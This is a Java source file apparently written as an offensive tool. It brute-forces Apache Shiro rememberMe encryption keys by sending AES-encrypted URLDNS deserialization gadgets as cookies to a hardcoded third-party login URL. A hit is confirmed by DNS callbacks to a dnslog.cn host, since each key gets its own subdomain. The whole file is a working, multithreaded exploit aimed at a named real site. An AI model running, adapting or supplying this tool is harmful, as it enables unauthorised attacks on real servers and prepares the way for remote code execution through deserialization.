import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.lang.reflect.*;

/**
 * SelfShiro — 独立 Shiro key 爆破 (URLDNS 外带判定)
 * 每个 key 独立子域, 目标 JVM 反序列化 URLDNS -> DNS 回连即命中
 *
 * 用法: java SelfShiro [CBC|GCM] [threads] [limit] [startIdx]
 */
public class SelfShiro {
    static String MODE = "CBC";
    static String TARGET = "http://ewei2.zhihu.com/login/";
    static String DOMAIN = "wci7gx.dnslog.cn";

    public static void main(String[] args) throws Exception {
        if (args.length > 0 && (args[0].equals("CBC") || args[0].equals("GCM"))) MODE = args[0];
        int threads = args.length > 1 ? Integer.parseInt(args[1]) : 30;
        int limit = args.length > 2 ? Integer.parseInt(args[2]) : Integer.MAX_VALUE;
        int startIdx = args.length > 3 ? Integer.parseInt(args[3]) : 0;
        String[] keys = readKeys();
        int n = Math.min(limit, keys.length - startIdx);
        System.out.println("[*] mode=" + MODE + " threads=" + threads + " keys=" + n
                + " (start=" + startIdx + ") target=" + TARGET + " domain=" + DOMAIN);

        ExecutorService pool = Executors.newFixedThreadPool(threads);
        CountDownLatch done = new CountDownLatch(n);
        AtomicInteger sent = new AtomicInteger();
        for (int i = 0; i < n; i++) {
            final int idx = startIdx + i;
            final String k = keys[idx];
            pool.submit(() -> {
                try {
                    String host = idx + ".c." + DOMAIN;          // 每 key 独立子域
                    byte[] payload = urlDNS("http://" + host);
                    String cookie = encrypt(k, payload);
                    send(TARGET, cookie);
                    int s = sent.incrementAndGet();
                    if (s % 200 == 0) System.err.println("[sent " + s + "]");
                } catch (Throwable t) {
                    System.err.println("key#" + idx + " ERR " + t);
                } finally { done.countDown(); }
            });
        }
        done.await();
        pool.shutdown();
        System.out.println("[*] 全部发送完成: " + n + " keys, 等待 DNS 回连 (dnslog.py poll)");
    }

    // ---- URLDNS gadget (ysoserial 标准) ----
    static byte[] urlDNS(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL, String> ht = new HashMap<>();
        URL u = new URL(null, url, handler);
        ht.put(u, url);
        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.setInt(u, -1);
        return serialize(ht);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException { return null; }
        protected synchronized InetAddress getHostAddress(URL u) { return null; }
    }

    static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        new ObjectOutputStream(bo).writeObject(o);
        return bo.toByteArray();
    }

    // ---- Shiro AES 加密 (CBC: IV16+AES/CBC/PKCS5; GCM: IV16+AES/GCM/NoPadding) ----
    static String encrypt(String b64key, byte[] data) throws Exception {
        byte[] key = Base64.getDecoder().decode(b64key);
        SecretKeySpec k = new SecretKeySpec(key, "AES");
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        byte[] ct;
        if (MODE.equals("GCM")) {
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.ENCRYPT_MODE, k, new GCMParameterSpec(128, iv));
            ct = c.doFinal(data);
        } else {
            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
            c.init(Cipher.ENCRYPT_MODE, k, new IvParameterSpec(iv));
            ct = c.doFinal(data);
        }
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        bo.write(iv); bo.write(ct);
        return Base64.getEncoder().encodeToString(bo.toByteArray());
    }

    // ---- 发送 GET /login 带 rememberMe ----
    static void send(String target, String cookie) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Cookie", "rememberMe=" + cookie);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(8000);
            conn.setInstanceFollowRedirects(false);
            conn.connect();
            conn.getResponseCode();
            try { conn.getInputStream().close(); } catch (Exception ignore) { }
        } catch (Exception e) { /* 404 等正常 */ }
    }

    static String[] readKeys() {
        List<String> l = new ArrayList<>();
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(
                    new FileInputStream("shiro_keys.txt"), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) {
                String k = line.trim();
                if (k.isEmpty()) continue;
                try {
                    int n = Base64.getDecoder().decode(k).length;
                    if (n == 16 || n == 24 || n == 32) l.add(k);
                } catch (Exception e) { }
            }
            br.close();
        } catch (Exception e) { throw new RuntimeException(e); }
        return l.toArray(new String[0]);
    }
}
